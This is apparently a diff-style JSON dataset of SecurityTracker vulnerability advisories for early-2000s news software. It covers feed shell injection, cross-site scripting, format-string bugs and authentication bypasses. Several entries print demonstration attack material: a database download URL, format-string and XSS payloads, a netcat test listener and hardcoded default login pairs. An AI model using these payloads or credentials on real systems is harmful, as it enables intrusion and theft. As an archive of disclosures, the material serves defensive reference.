architecture:\n\n    http://security.debian.org/pool/updates/main/g/gkrellm-newsticker/gkrellm-newsticker_0.3-3.1_mipsel.deb\n      Size/MD5 checksum:    35532 ead6c8290f38890b11188406c990180d\n\n  PowerPC architecture:\n\n    http://security.debian.org/pool/updates/main/g/gkrellm-newsticker/gkrellm-newsticker_0.3-3.1_powerpc.deb\n      Size/MD5 checksum:    41210 cb1ee388ea55ce2d4e5e7d7f2af1cf52\n\n  IBM S/390 architecture:\n\n    http://security.debian.org/pool/updates/main/g/gkrellm-newsticker/gkrellm-newsticker_0.3-3.1_s390.deb\n      Size/MD5 checksum:    42644 1c1bc26dcf280c12df5785c6ba6afe24\n\n  Sun Sparc architecture:\n\n    http://security.debian.org/pool/updates/main/g/gkrellm-newsticker/gkrellm-newsticker_0.3-3.1_sparc.deb\n      Size/MD5 checksum:    39512 4a731f1d3ff438ab0d8b2fd3852a45a0",
+    "Vendor URL": "gk-newsticker.sourceforge.net/",
+    "Cause": [
+        "Exception handling error",
+        "Input validation error"
+    ],
+    "Underlying OS": "Linux (Debian)",
+    "Underlying OS Comments": "3.0",
+    "Message History": [
+        "https://securitytracker.com/id/1006639"
+    ]
+}{
+    "source": "1-2",
+    "Title": "GKrellM Newsticker Lets Remote Users Execute Arbitrary Shell Commands on the Target User's Client",
+    "SecurityTracker Alert ID": "1006639",
+    "SecurityTracker URL": "http://securitytracker.com/id/1006639",
+    "CVE Reference": [
+        "CVE-2003-0205",
+        "CVE-2003-0206"
+    ],
+    "Updated": "Dec  7 2003",
+    "Original Entry Date": "Apr 24 2003",
+    "Impact": [
+        "Denial of service via network",
+        "Execution of arbitrary code via network",
+        "User access via network"
+    ],
+    "Fix Available": "Yes",
+    "Version(s)": "0.3, possibly 0.3.5",
+    "Description": "Two vulnerabilities were reported in the GKrellM Newsticker plug-in.  A remote server can execute arbitrary shell commands on the target user's system in certain cases or cause the target user's GKrellM system to crash.\nIt is reported that a malicious RDF news feed can provide URLs containing special shell characters so that, when the target user clicks on the affected ticker title, arbitrary shell commands will be executed on the target user's host.\n\nIt is also reported that the news ticker software can cause the entire GKrellM system to crash via an RDF file that has a link or a title element that is not limited to a single line.  A remote user (acting as a server) could supply a specially crafted RDF file to cause the target user's GKrellM application to crash.\n\nBrian Campbell is credited with discovering these flaws.",
+    "Impact'": "A remote user (acting as a server) can execute arbitrary shell commands on the target user's system.\n\nA remote user (acting as a server) can cause the target user's GKrellM system to crash.",
+    "Solution": "An unofficial patch is available in the Source Message.  The patch applies to version 0.3.\n\n[Editor's note: The latest version on the vendor's web site is 0.3.5. It is not clear whether 0.3.5 is also vulnerable.  However, version 0.3.5 is dated October 20, 2002 and does not contain the patch.]",
+    "Vendor URL": "gk-newsticker.sourceforge.net/",
+    "Cause": [
+        "Exception handling error",
+        "Input validation error"
+    ],
+    "Underlying OS": [
+        "Linux (Any)",
+        "UNIX (Any)"
+    ],
+    "Message History": [
+        "https://securitytracker.com/id/1006642"
+    ]
+}{
+    "source": "1-2",
+    "Title": "PT News Authentication Flaw Lets Remote Users Access Administrative Functions",
+    "SecurityTracker Alert ID": "1006615",
+    "SecurityTracker URL": "http://securitytracker.com/id/1006615",
+    "CVE Reference": "GENERIC-MAP-NOMATCH",
+    "Date": "Apr 21 2003",
+    "Impact": [
+        "Denial of service via network",
+        "Disclosure of user information",
+        "Modification of user information"
+    ],
+    "Fix Available": "Yes",
+    "Vendor Confirmed": "Yes",
+    "Exploit Included": "Yes",
+    "Version(s)": "1.7.7",
+    "Description": "Arnaud Jacques reported a vulnerability in PT News.  A remote user can gain access to administrative functions without authenticating.\nAdministrative functions are reportedly implemented in the 'news.inc' file, which is included by the 'index.php' file.  A remote user can sumbit a specially crafted URL or POST request via 'index.php' to access administrative functions.  This reportedly allows a remote user to create, edit, delete, or replace news entries on the system.",
+    "Impact'": "A remote user can access administrative functions on the application.",
+    "Solution": "The vendor has released a fixed version (1.7.8), available at:\n\nhttp://www.openbg.net/ptsite/",
+    "Vendor URL": "www.openbg.net/ptsite/",
+    "Cause": "Authentication error",
+    "Message History": "None."
+}{
+    "source": "1-2",
+    "Title": "Web Wiz Site News Discloses Administrator Password to Remote Users",
+    "SecurityTracker Alert ID": "1006574",
+    "SecurityTracker URL": "http://securitytracker.com/id/1006574",
+    "CVE Reference": "GENERIC-MAP-NOMATCH",
+    "Date": "Apr 14 2003",
+    "Impact": [
+        "Disclosure of authentication information",
+        "User access via network"
+    ],
+    "Exploit Included": "Yes",
+    "Version(s)": "3.06",
+    "Description": "A vulnerability was reported in Web Wiz Site News.  A remote user can retrieve the administrator's password.\nBlack Tigerz Research Group reported that the software stores the administrator's password without encryption in an MS Access database that can be downloaded by a remote user.  A demonstration exploit URL is provided:\n\nhttp://[target]/news/news.mdb",
+    "Impact'": "A remote user can obtain the administrator's password and gain administrative access to the application.",
+    "Solution": "No solution was available at the time of this entry.",
+    "Vendor URL": "www.webwizguide.info/asp/sample_scripts/site_news_script.asp",
+    "Cause": "Access control error",
+    "Underlying OS": "Windows (Any)",
+    "Message History": "None."
+}{
+    "source": "1-2",
+    "Title": "Leafnode NNTP News Server Lets Remote Users Deny Service",
+    "SecurityTracker Alert ID": "1005865",
+    "SecurityTracker URL": "http://securitytracker.com/id/1005865",
+    "CVE Reference": "CVE-2002-1661",
+    "Updated": "Jun  8 2008",
+    "Original Entry Date": "Dec 30 2002",
+    "Impact": "Denial of service via network",
+    "Fix Available": "Yes",
+    "Vendor Confirmed": "Yes",
+    "Version(s)": "After 1.9.19 and prior to 1.9.30",
+    "Description": "A vulnerability was reported in the leafnode NNTP news server.  A remote user could cause denial of service conditions.\nIt is reported that a remote user could cause the CPU utilization to reach 100%.  This can occur if there is a news article that has been cross-posted to several Usenet newsgroups when one newsgroup is the prefix of another group.  This naming situation is not permitted by Usenet naming conventions but may exist in some newsgroups.  When the remote user requests an affected article, the server will enter an infinite loop and consume excessive CPU resources.\n\nThe vendor credits Jan Knutar and Mark Brown for reporting this flaw.",
+    "Impact'": "A remote user can cause the server to consume all available CPU resources.",
+    "Solution": "The vendor has issued a fixed version (1.9.30 or later), available at:\n\nhttp://sourceforge.net/project/showfiles.php?group_id=57767&release_id=130347",
+    "Vendor URL": "www.leafnode.org",
+    "Cause": "State error",
+    "Underlying OS": [
+        "Linux (Any)",
+        "UNIX (Any)"
+    ],
+    "Message History": "None."
+}{
+    "source": "1-2",
+    "Title": "MyNewsGroups :) Input Validation Holes Let Remote Users Conduct Cross-Site Scripting Attacks",
+    "SecurityTracker Alert ID": "1005320",
+    "SecurityTracker URL": "http://securitytracker.com/id/1005320",
+    "CVE Reference": "GENERIC-MAP-NOMATCH",
+    "Date": "Sep 30 2002",
+    "Impact": [
+        "Disclosure of authentication information",
+        "Disclosure of user information",
+        "Execution of arbitrary code via network",
+        "Modification of user information",
+        "User access via network"
+    ],
+    "Exploit Included": "Yes",
+    "Version(s)": "0.4, 0.4.1",
+    "Description": "Some input validation vulnerabilities were reported in 'MyNewsGroups :-)'.  A remote user can conduct cross-site scripting attacks against users to gain access to their accounts.\nMyNewsGroups :) reportedly does not filter HTML tags from the Subject headers.  A remote user can submit a specially crafted newsgroup message that, when viewed by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the MyNewsGroups :-)and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user. \n\nThis allows the remote user to take over a target user's account and post fake messages on behalf of the target user.\n\nThe vendor has reportedly been notified.",
+    "Impact'": "A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running 'MyNewsGroups :-)', access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.",
+    "Solution": "No solution was available at the time of this entry.\n\nThe author of the report has provided an unofficial patch, available in the Source Message (it is Base64 encoded).",
+    "Vendor URL": "mynewsgroups.sourceforge.net/",
+    "Cause": "Input validation error",
+    "Underlying OS": [
+        "Linux (Any)",
+        "UNIX (Any)",
+        "Windows (Any)"
+    ],
+    "Message History": "None."
+}{
+    "source": "1-2",
+    "Title": "MyNewsGroups :) PHP-based USENET News Client Bug Lets Remote Users Execute Arbitrary Code on the Server",
+    "SecurityTracker Alert ID": "1004756",
+    "SecurityTracker URL": "http://securitytracker.com/id/1004756",
+    "CVE Reference": "GENERIC-MAP-NOMATCH",
+    "Date": "Jul 12 2002",
+    "Impact": [
+        "Execution of arbitrary code via network",
+        "User access via network"
+    ],
+    "Fix Available": "Yes",
+    "Vendor Confirmed": "Yes",
+    "Version(s)": "0.4 and prior versions",
+    "Description": "A vulnerability was reported in the 'MyNewsGroups :)' web-based USENET news client.  When the product is configured in a certain manner, a remote user can cause arbitrary PHP commands to be executed on the system.\nAccording to the report, the software is vulnerable when configured with the 'register_globals' and 'allow_url_fopen' settings on. A remote user can include a PHP file located on a remote server.  This allows the remote user to execute arbitrary PHP code (including system commands) on the web server that is running MyNewsGroups :) with the privileges of the web server.",
+    "Impact'": "A remote user may be able to execute arbitrary code on the system with the privileges of the web server.",
+    "Solution": "The vendor has released a fixed version (0.4.1), available at:\n\nhttp://mynewsgroups.sourceforge.net/\nhttp://prdownloads.sourceforge.net/mynewsgroups/MyNewsGroups-0.4.1.tar.gz",
+    "Vendor URL": "mynewsgroups.sourceforge.net/",
+    "Cause": [
+        "Input validation error",
+        "State error"
+    ],
+    "Underlying OS": [
+        "Linux (Any)",
+        "UNIX (Any)",
+        "Windows (Any)"
+    ],
+    "Underlying OS Comments": "PHP-based",
+    "Message History": "None."
+}{
+    "source": "1-2",
+    "Title": "'nn' News Reader Format String Hole Lets Remote Malicious News Server Execute Arbitrary Code on the Client",
+    "SecurityTracker Alert ID": "1004708",
+    "SecurityTracker URL": "http://securitytracker.com/id/1004708",
+    "CVE Reference": "GENERIC-MAP-NOMATCH",
+    "Date": "Jul  4 2002",
+    "Impact": [
+        "Execution of arbitrary code via network",
+        "User access via network"
+    ],
+    "Fix Available": "Yes",
+    "Vendor Confirmed": "Yes",
+    "Exploit Included": "Yes",
+    "Version(s)": "6.6.3 and prior",
+    "Description": "A vulnerability was reported in the 'nn' news reader client software.  A remote server may be able to cause arbitrary code to be executed on the client.\nIt is reported that news client uses server-supplied input in a format string to print error messages on the client terminal.\n\nA demonstration exploit server response is provided:\n\n100 AAAABBBB%10\\$x%11\\$x\n\nThe vulnerability reportedly exists in an unsafe nn_existmsg() call in the nntp.c file.",
+    "Impact'": "A remote user with control of a news server can cause arbitrary code to be executed on the client when the client connects to the malicious news server.",
+    "Solution": "The vendor has released a fixed version (6.6.4), available at:\n\nhttp://www.nndev.org/\n\nAccording to the report, this vulnerability was also fixed recently in the FreeBSD ports collection.",
+    "Vendor URL": "nndev.org/",
+    "Cause": "Input validation error",
+    "Underlying OS": [
+        "Linux (Any)",
+        "UNIX (Any)"
+    ],
+    "Message History": "None."
+}{
+    "source": "1-2",
+    "Title": "Slurp Passive News Reader Format String Hole Lets Remote Users Execute Arbitrary Code on the System",
+    "SecurityTracker Alert ID": "1004452",
+    "SecurityTracker URL": "http://securitytracker.com/id/1004452",
+    "CVE Reference": "GENERIC-MAP-NOMATCH",
+    "Date": "Jun  4 2002",
+    "Impact": [
+        "Execution of arbitrary code via network",
+        "User access via network"
+    ],
+    "Exploit Included": "Yes",
+    "Version(s)": "1.10",
+    "Description": "A format string vulnerability was reported in 'Slurp', a passive NNTP news reader.  A local user with control over an NNTP server can cause arbitrary code to be executed on the system running Slurp when Slurp downloads news from the malicious NNTP server.\nStrategic Reconnaissance Team warned that the application makes insecure calls to syslog() without ensuring the proper formatting or validating server-supplied input.\n\nThe following command can be used to determine if your Slurp client is vulnerable:\n\nperl -e 'print \"200 Hello brother \\n666 %x%x%x\\n'\" | nc -l -p 119\n\nIf vulnerable, the following type of entry will be found in the /var/log/messages log file:\n\nJun  5 05:10:22 yada slurp[39926]: do_newnews: NNTP protocol error: got '666 bfbff4f8804bc1bbfbff51c'",
+    "Impact'": "A remote user with control of a news server can cause arbitrary code to be executed by the Slurp client when Slurp connects to the news server to download Usenet news messages.  The code will run with the privileges of the Slurp process.",
+    "Solution": "No solution was available at the time of this entry.",
+    "Cause": "Input validation error",
+    "Underlying OS": [
+        "Linux (Any)",
+        "UNIX (Any)"
+    ],
+    "Message History": "None."
+}{
+    "source": "1-2",
+    "Title": "NetWin DNews News Server Has Unspecified 'Security Fault' That May Allow Remote Users to Access the Management Interface",
+    "SecurityTracker Alert ID": "1004284",
+    "SecurityTracker URL": "http://securitytracker.com/id/1004284",
+    "CVE Reference": "GENERIC-MAP-NOMATCH",
+    "Date": "May 13 2002",
+    "Impact": [
+        "Modification of user information",
+        "User access via network"
+    ],
+    "Fix Available": "Yes",
+    "Vendor Confirmed": "Yes",
+    "Version(s)": "prior to 5.5h2",
+    "Description": "A vulnerability was reported in the NetWin's DNews News Server by the NetWin vendor.  The nature of the vulnerability was not reported.\nThe vendor only indicates that a 'security fault' has been discovered. No further information was provided.\n\n[Editor's note:  Based on another message posted to the netwin.dnews newsgroup, it appears that the vulnerability involves the management interface on port 7119 and may allow a remote user to reconfigure the system.]",
+    "Impact'": "A remote user may be able to gain access to the management interface and reconfigure the system.",
+    "Solution": "The vendor has released a fixed version (5.5h2), available at:\n\nhttp://netwinsite.com/dnews/download2.htm\n\nThe vendor also advises restricting remote access using the following type of access controls in the dnews.conf file (in the following example, the local IP addresses are 10.0.0.*):\n\n         tellnews_pass_mask 10.0.0.*,127.0.0.1\n         dmgrsvc_access 10.0.0.*,127.0.0.1",
+    "Vendor URL": "netwinsite.com/dnews.htm",
+    "Cause": "Not specified",
+    "Underlying OS": [
+        "Linux (Any)",
+        "UNIX (Any)",
+        "Windows (Any)"
+    ],
+    "Message History": "None."
+}{
+    "source": "1-2",
+    "Title": "Slrnpull News Retrieval Application Buffer Overflow in Spool Directory Option May Allow Local Users to Obtain Elevated Privileges",
+    "SecurityTracker Alert ID": "1004126",
+    "SecurityTracker URL": "http://securitytracker.com/id/1004126",
+    "CVE Reference": "GENERIC-MAP-NOMATCH",
+    "Date": "Apr 23 2002",
+    "Impact": [
+        "Execution of arbitrary code via local system",
+        "Root access via local system",
+        "User access via local system"
+    ],
+    "Exploit Included": "Yes",
+    "Version(s)": "The version distributed with Red Hat 6.2 Linux",
+    "Description": "A buffer overflow vulnerability has been reported in the 'slrnpull' news retrieval application.  A local user may be able to gain elevated privileges on the system, possibly including root level privilegges.\nA remote user can reportedly call 'slrnpull' with the -d Spool Directory option, supplying a specially crafted long string as the argument, to trigger the buffer overflow and cause arbitrary code to be executed on the system.\n\nIt is reported that 'slrnpull' is configured with set user id (suid) or set group id (sgid) root privileges on some systems.  It may also be configured with sgid 'news' group privileges on other systems.\n\nA short demonstration exploit transcript and some debugging data is provided in the Source Message.",
+    "Impact'": "A local user may be able to cause arbitrary code to be executed on the system.  The privileges that the code will run with may be root user, root group, or news group privileges, depending on the particular configuration for that system.",
+    "Solution": "The author of the report has provided the following workaround:\n\nTemporarily remove the suid root or sgid root attribute of slrnpull:\n\n# chmod a-s /usr/bin/slrnpull\n\nThe author indicates that newer fixed versions may be available.  However, this has not yet been confirmed.",
+    "Vendor URL": "www.slrn.org/",
+    "Cause": "Boundary error",
+    "Underlying OS": [
+        "Linux (Any)",
+        "UNIX (Any)"
+    ],
+    "Message History": "None."
+}{
+    "source": "1-2",
+    "Title": "InterNetNews (INN) Format String Bugs May Let Local Users Obtain Elevated Privileges on the System",
+    "SecurityTracker Alert ID": "1004028",
+    "SecurityTracker URL": "http://securitytracker.com/id/1004028",
+    "CVE Reference": "GENERIC-MAP-NOMATCH",
+    "Date": "Apr 12 2002",
+    "Impact": [
+        "Execution of arbitrary code via local system",
+        "User access via local system"
+    ],
+    "Exploit Included": "Yes",
+    "Version(s)": "2.2.3 and prior versions",
+    "Description": "Several format string vulnerabilities have been reported in the InterNetNews (INN) Usenet news system.  A local user may be able to obtain elevated privileges on the system.\nIt is reported that there are several format string coding bugs and unsecure open() calls in INN, particularly in the 'inews' and 'rnews' binaries.  If those binaries are configured with set group id (sgid) or set user id (suid) privileges and are executable by any user, a local user may be able to obtain elevated privileges.  \n\nFor example, a local user can reportedly exploit 'inews' to obtain 'news' user privileges due to the following format string error in the 'frontends/inews.c' file:\n\n(void)sprintf(buff, innconf->mta, address);\n\nA demonstration exploit is included in the Source Message (it is a Base64-encoded gunzipped tar file).\n\nThe vendors have reportedly been notified.",
+    "Impact'": "A local user may be able to obtain 'news' user privileges or 'news' group privileges.",
+    "Solution": "No solution was available at the time of this entry.",
+    "Vendor URL": "www.isc.org/",
+    "Cause": "Input validation error",
+    "Underlying OS": [
+        "Linux (Any)",
+        "UNIX (Any)"
+    ],
+    "Message History": "None."
+}{
+    "source": "1-2",
+    "Title": "News-tnk Input Validation Error Lets Remote Users Conduct Cross-Site Scripting Attacks",
+    "SecurityTracker Alert ID": "1003886",
+    "SecurityTracker URL": "http://securitytracker.com/id/1003886",
+    "CVE Reference": "GENERIC-MAP-NOMATCH",
+    "Date": "Mar 22 2002",
+    "Impact": [
+        "Disclosure of authentication information",
+        "Execution of arbitrary code via network"
+    ],
+    "Fix Available": "Yes",
+    "Vendor Confirmed": "Yes",
+    "Exploit Included": "Yes",
+    "Version(s)": "1.2.1 and prior versions",
+    "Description": "ALPER Research Labs reported a vulnerability in the 'news-tnk' web-based news application.  Remote users can conduct cross-site scripting attacks against news-tnk site users.\nIt is reported that the \"WEB\" input field is not properly filtered. A remote user can submit the following type of information to this field:\n\n&lt;script&gt;alert(\"ALPERz was here!\")&lt;/script&gt;\n\nThen, when another user views the web page, the code will be executed. The code will appear to originate from the site running news-tnk and will run in the security context of that site. The code will be able to access the user's cookies associated with the site (if any).",
+    "Impact'": "A remote user can conduct cross-site scripting attacks against news-tnk users to obtain their authentication cookies and other sensitive information.",
+    "Solution": "The vendor has released a fixed version (1.2.2), available at:\n\nhttp://www.linux-sottises.net/software.php",
+    "Vendor URL": "www.linux-sottises.net/software.php",
+    "Cause": "Input validation error",
+    "Underlying OS": [
+        "Linux (Any)",
+        "UNIX (Any)",
+        "Windows (Any)"
+    ],
+    "Message History": "None."
+}{
+    "source": "1-2",
+    "Title": "X-news PHP News Management System Lets Remote Users Access the Administrator Menu",
+    "SecurityTracker Alert ID": "1003828",
+    "SecurityTracker URL": "http://securitytracker.com/id/1003828",
+    "CVE Reference": "CVE-2002-1656",
+    "Updated": "May 22 2008",
+    "Original Entry Date": "Mar 15 2002",
+    "Impact": "User access via network",
+    "Exploit Included": "Yes",
+    "Version(s)": "1.1",
+    "Description": "A vulnerability was reported in the 'x-news' PHP-based news management system.  A remote user can gain unauthorized access to the administrator menu.\nThe vulnerability reportedly exists in x_news.php.\n\nIt is reported that a remote user can view the 'users.txt' file to identify an administrator and their username and encrypted password.  The format of this file:\n\nuser_id|username|pass(md5)|mail|user_level\n\nThe administrator can reportedly be identified by the 'user_level' field, which has the following values:\n\n1 = Super Admin 2 = Admin 3 = Writer\n\nIt is reported that a remote user can view the users.txt file via x_news.php by sending a certain cookie with the name of a username with no value.  Then, knowing a valid username and password of an administrator (from having viewed the users.txt file), the remote user can send a cookie with the name of a valid administrator and with the value of the md5 password for that administrator to x_news.php to gain administrator access.\n\nWith administrator access, the remote user can reportedly access the following administrator menu options:\n\n-Add news\n-Edit news\n-Apply changes\n-Control panel\n-Add/remove Users\n-Manage Comments",
+    "Impact'": "A remote user can gain administrative access to the application.",
+    "Solution": "No solution was available at the time of this entry.",
+    "Vendor URL": "www.xqus.com/index.php?page=x_news",
+    "Cause": [
+        "Access control error",
+        "Authentication error"
+    ],
+    "Underlying OS": [
+        "Linux (Any)",
+        "UNIX (Any)",
+        "Windows (Any)"
+    ],
+    "Underlying OS Comments": "PHP-based",
+    "Message History": "None."
+}{
+    "source": "1-2",
+    "Title": "NetWin's WebNEWS Server Has Built-in Default User Names That Cannot Be Removed and That Allow Remote Users to Gain Access",
+    "SecurityTracker Alert ID": "1003632",
+    "SecurityTracker URL": "http://securitytracker.com/id/1003632",
+    "CVE Reference": "GENERIC-MAP-NOMATCH",
+    "Date": "Feb 22 2002",
+    "Impact": "User access via network",
+    "Exploit Included": "Yes",
+    "Version(s)": "1.1k",
+    "Description": "A vulnerability was reported in NetWin's WebNEWS server application.  A remote user can log in with any of several default user names.  These names cannot be removed.\nIt is reported that the CGI binaries contains four default user names within the binary code that can not be removed by the administrator. The following username and password combinations can be used by remote users to access the WebNEWS application:\n\ntestweb, newstest\nalwn3845, imaptest\nalwi3845, wtest3452\ntestweb2, wtest4879",
+    "Impact'": "A remote user can log in with any of several default user names.",
+    "Solution": "No solution was available at the time of this entry.",
+    "Vendor URL": "www.netwinsite.com/webnews/index.htm",
+    "Cause": "Configuration error",
+    "Underlying OS": [
+        "Linux (Any)",
+        "UNIX (Any)",
+        "Windows (NT)",
+        "Windows (2000)"
+    ],
+    "Underlying OS Comments": "Tested on Red Hat Linux 7.0",
+    "Message History": "None."
+}{
+    "source": "1-2",
+    "Title": "Netwin's WebNEWS News Server CGI May Execute Arbitrary Code Supplied By Remote Users",
+    "SecurityTracker Alert ID": "1003603",
+    "SecurityTracker URL": "http://securitytracker.com/id/1003603",
+    "CVE Reference": "GENERIC-MAP-NOMATCH",
+    "Date": "Feb 19 2002",
+    "Impact": [
+        "Execution of arbitrary code via network",
+        "User access via network"
+    ],
+    "Fix Available": "Yes",
+    "Vendor Confirmed": "Yes",
+    "Exploit Included": "Yes",
+    "Description": "NGSSoftware issued a security advisory warning of a buffer overflow vulnerability in the WebNEWS news server.  A remote user can execute arbitrary code on the server.\nIt is reported that a remote user can supply a long string (approximately 1500 bytes) in the 'group' parameter of a query string when the server receives a vaild \"utoken\" user session token.  This will apparently trigger the flaw and cause arbitrary code to be executed.\n\nIt is reported that the code will be executed in the security context of the low privileged account used by Microsoft Internet Information Server (IIS) to service these requests.",
+    "Impact'": "A remote user can cause the CGI code to execute arbitrary code on the system with the privileges that IIS uses to execute CGI.",
+    "Solution": "The vendor has released a fix, available at:\n\nftp://netwinsite.com/pub/webnews/beta/",
+    "Vendor URL": "www.netwinsite.com/webnews/index.htm",
+    "Cause": "Boundary error",
+    "Underlying OS": [
+        "Linux (Any)",
+        "UNIX (Any)",
+        "Windows (NT)",
+        "Windows (2000)"
+    ],
+    "Underlying OS Comments": "Tested on Windows NT/2000 using IIS; may or may not affect Linux/UNIX",
+    "Message History": "None."
+}{
+    "source": "1-2",
+    "Title": "CGINews Web-based News Management Application Discloses Files on the System to Remote Users",
+    "SecurityTracker Alert ID": "1003506",
+    "SecurityTracker URL": "http://securitytracker.com/id/1003506",
+    "CVE Reference": "CVE-2002-1736",
+    "Updated": "May 20 2008",
+    "Original Entry Date": "Feb 10 2002",
+    "Impact": [
+        "Disclosure of system information",
+        "Disclosure of user information"
+    ],
+    "Fix Available": "Yes",
+    "Vendor Confirmed": "Yes",
+    "Version(s)": "prior to 1.06",
+    "Description": "A vulnerability was reported in CGINews, a web-based application designed to allow news entries to be added to a web site.  A remote user may be able to view files on the system.\nIt is reported that an input validation flaw exists that allows a remote user to view files located anywhere on the system that are readable by the web server daemon.",
+    "Impact'": "A remote user may be able to view files on the system with the privileges of the web server.",
+    "Solution": "The vendor has released a fixed version (1.06), available at:\n\nhttp://triskam.virtualave.net/cginews.html",
+    "Vendor URL": "triskam.virtualave.net/cginews.html",
+    "Cause": "Input validation error",
+    "Underlying OS": [
+        "Linux (Any)",
+        "UNIX (Any)",
+        "Windows (Any)"
+    ],
+    "Underlying OS Comments": "Perl-based",
+    "Message History": "None."
+}{
+    "source": "1-2",
+    "Title": "BAVO PHP-based Web News Software Authentication Bug Lets Remote Users Gain Administrative Access to the Application",
+    "SecurityTracker Alert ID": "1003503",
+    "SecurityTracker URL": "http://securitytracker.com/id/1003503",
+    "CVE Reference": "CVE-2002-1719",
+    "Updated": "May 20 2008",
+    "Original Entry Date": "Feb 10 2002",
+    "Impact": "User access via network",
+    "Fix Available": "Yes",
+    "Vendor Confirmed": "Yes",
+    "Exploit Included": "Yes",
+    "Version(s)": "0.3",
+    "Description": "An authentication vulnerability was reported in BAVO, a PHP-based news-oriented web server application.  A remote user can gain 'admin' access on the application.\nThe vulnerability was due to a bug in the checking of administrator passwords.  Administator passwords were not checked so that any remote user could perform administrative functions on the application, including deleting or editing messages.\n\nThe vendor reports that Bavo is a work-in-progress and should *never* be used in an environment where security is required.",
+    "Impact'": "A remote user can gain 'admin' access on the application and can delete or edit messages.",
+    "Solution": "The vendor has released a fixed version (0.3.1), available at:\n\nhttp://freshmeat.net/redir/bavo/19259/url_tgz/bavo-0.3.1.tgz\n\nThe vendor strongly notes that BAVO is a work-in-progress and is not intended for security critical environments.",
+    "Vendor URL": "friet.patat.org/~florizla/bavo/",
+    "Cause": "Authentication error",
+    "Underlying OS": [
+        "Linux (Any)",
+        "UNIX (Any)",
+        "Windows (Any)"
+    ],
+    "Underlying OS Comments": "PHP-based",
+    "Message History": "None."
+}{
+    "source": "1-2",
+    "Title": "NewsReactor Usenet Binary Retrieval Utility Discloses Passwords to Local Users",
+    "SecurityTracker Alert ID": "1003332",
+    "SecurityTracker URL": "http://securitytracker.com/id/1003332",
+    "CVE Reference": "GENERIC-MAP-NOMATCH",
+    "Date": "Jan 23 2002",
+    "Impact": "Disclosure of authentication information",
+    "Exploit Included": "Yes",
+    "Description": "A vulnerability has been reported in NewsReactor, a utility designed to download binaries form Usenet newsgroups.  A local user can obtain passwords from a configuration file.\nSecuriTeam reported that a local user can obtain passwords from the NewsReactor.ini file.  The passwords are apparently encoded with an ASCII offset (64 characters up).\n\nA demonstration exploit script is provided in the Source Message.\n\nSecuriTeam notes that the vulnerability was reported by Adi Feldman.",
+    "Impact'": "A local user can obtain encoded (but not encrypted) passwords from a configuration file.",
+    "Solution": "No solution was available at the time of this entry.",
+    "Vendor URL": "www.daansystems.com/newsreactor/",
+    "Cause": "Access control error",
+    "Underlying OS": "Windows (Any)",
+    "Message History": "None."
+}{
+    "source": "1-2",
+    "Title": "MiraMail Messaging Systems Discloses Sensitive Configuration Data (Including Passwords) to Local Users and Allows Local Users to Modify the Configuration",
+    "SecurityTracker Alert ID": "1003177",
+    "SecurityTracker URL": "http://securitytracker.com/id/1003177",
+    "CVE Reference": "GENERIC-MAP-NOMATCH",
+    "Date": "Jan 10 2002",
+    "Impact": [
+        "Disclosure of authentication information",
+        "Disclosure of user information",
+        "Modification of authentication information",
+        "Modification of user information"
+    ],
+    "Vendor Confirmed": "Yes",
+    "Exploit Included": "Yes",
+    "Version(s)": "1.04 and prior versions",
+    "Description": "A vulnerability was reported in the MiraMail messaging system.  A local user can view and modify the configuration files which contain POP e-mail account names and passwords and MiraMail user accounts and groups.\nIt is reported that configuration data is stored in plain text in an \".ini\" file in the MiraMail directory.",
+    "Impact'": "A local user can view and modify the configuration files.  These files reportedly may contain POP e-mail account names and passwords and MiraMail user accounts and groups.",
+    "Solution": "No solution was available at the time of this entry.  However, the vendor has reportedly confirmed the problem and indicated that the next version to be released (1.05) will encrypt the \".ini\" files with md5 encryption, to be released in the next couple of weeks.",
+    "Vendor URL": "www.nevrona.com/miramail/",
+    "Cause": "Access control error",
+    "Underlying OS": "Windows (Any)",
+    "Message History": "None."
+}{
+    "source": "1-2",
+    "Title": "Slrn News Reader Automatically Executes Shell Scripts Embedded Within News Articles",
+    "SecurityTracker Alert ID": "1002446",
+    "SecurityTracker URL": "http://securitytracker.com/id/1002446",
+    "CVE Reference": "GENERIC-MAP-NOMATCH",
+    "Updated": "Sep 25 2001",
+    "Original Entry Date": "Sep 25 2001",
+    "Impact": "Execution of arbitrary code via network",
+    "Fix Available": "Yes",
+    "Vendor Confirmed": "Yes",
+    "Exploit Included": "Yes",
+    "Version(s)": "all versions >= 0.6.0",
+    "Description": "A vulnerability was reported in slrn, a news reader (s-lang read news).  The news reader will execute shell scripts contained in a news article when the article is viewed.\nWhen extracting binary files, all versions of slrn will execute any shell scripts that are included in the article being decoded, apparently assuming that the script is a self-extracting archive.\n\nIt is reported that the vulnerability has been fixed in version 0.9.6.2-9potato2.  The shell code execution feature has been removed.",
+    "Impact'": "A remote user could post a news article containing a malicious shell script that will be executed by the newsreader when the news article is viewed.",
+    "Solution": "A fixed version is available.  See the Vendor URL for the source code.  For Debian users, see the Debian security advisory in the Source Message.",
+    "Vendor URL": "slrn.sourceforge.net/patches/index.html#subsect_decode",
+    "Cause": "State error",
+    "Underlying OS": [
+        "Linux (Any)",
+        "UNIX (Any)"
+    ],
+    "Message History": "None."
+}{
+    "source": "1-2",
+    "Title": "Microsoft Windows NNTP Network News Service Has a Memory Leak That Allows Remote Users to Cause the Server to Crash",
+    "SecurityTracker Alert ID": "1002197",
+    "SecurityTracker URL": "http://securitytracker.com/id/1002197",
+    "CVE Reference": "CVE-2001-0543",
+    "Date": "Aug 15 2001",
+    "Impact": "Denial of service via network",
+    "Fix Available": "Yes",
+    "Vendor Confirmed": "Yes",
+    "Description": "Microsoft reported a vulnerability in their Network News Transport Protocol (NNTP) service for Windows NT 4.0 and Windows 2000. The service contains a memory leak that allows a remote user to make multiple NNTP posts to cause the server to crash.\nIt is reported that the memory leak is in a routine that processes news postings. Each time a remote user makes a post that contains a particular construction (which is not identified by the vendor), the vulnerability is triggered and some memory becomes not available for use.  If a remote user makes many posts, enough memory on the server could be depeted causing the server to crash.\n\nThe vendor reports that an affected server can be restored to normal service by rebooting.",
+    "Impact'": "A remote user can create a news post that, if many such posts are submitted, could cause the server to crash.",
+    "Solution": "The vendor recommends that system administrators apply the patch immediately.  Patch information is available at the Vendor URL.",
+    "Vendor URL": "www.microsoft.com/technet/security/bulletin/MS01-043.asp",
+    "Cause": "Resource error",
